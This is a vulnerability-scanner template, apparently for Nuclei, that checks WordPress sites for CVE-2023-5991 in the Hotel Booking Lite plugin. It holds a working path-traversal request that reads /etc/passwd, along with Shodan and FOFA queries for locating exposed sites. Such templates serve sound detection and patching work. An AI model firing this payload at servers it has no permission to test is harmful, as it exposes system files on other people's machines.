http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: and
    part: header
    type: word
    words:
    - filename=
    - /etc/passwd
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?filename=../../../../../../etc/passwd&mphb_action=download'
id: CVE-2023-5991
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:motopress:hotel_booking_lite:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-5991
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99069
    epss-score: 0.80139
  description: 'The Hotel Booking Lite WordPress plugin before 4.8.5 does not validate
    file paths provided via user input, as well as does not have proper CSRF and authorisation
    checks, allowing unauthenticated users to download and delete arbitrary files
    on the server

    '
  impact: 'Unauthenticated attackers can exploit missing validation and authorization
    checks to download and delete arbitrary files on WordPress servers running Hotel
    Booking Lite.

    '
  metadata:
    fofa-query: body=/wp-content/plugins/motopress-hotel-booking
    framework: wordpress
    max-request: 1
    product: hotel_booking_lite
    publicwww-query: /wp-content/plugins/motopress-hotel-booking
    shodan-query: http.html:/wp-content/plugins/motopress-hotel-booking
    vendor: motopress
    verified: true
  name: Hotel Booking Lite < 4.8.5 - Arbitrary File Download & Deletion
  reference:
  - https://wpscan.com/vulnerability/e9d35e36-1e60-4483-b8b3-5cbf08fcd49e/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-5991
  remediation: Fixed in 4.8.5
  severity: critical
  tags: cve,cve2023,lfi,motopress-hotel-booking,wordpress,wp-plugin,wpscan,wp,motopress,vuln
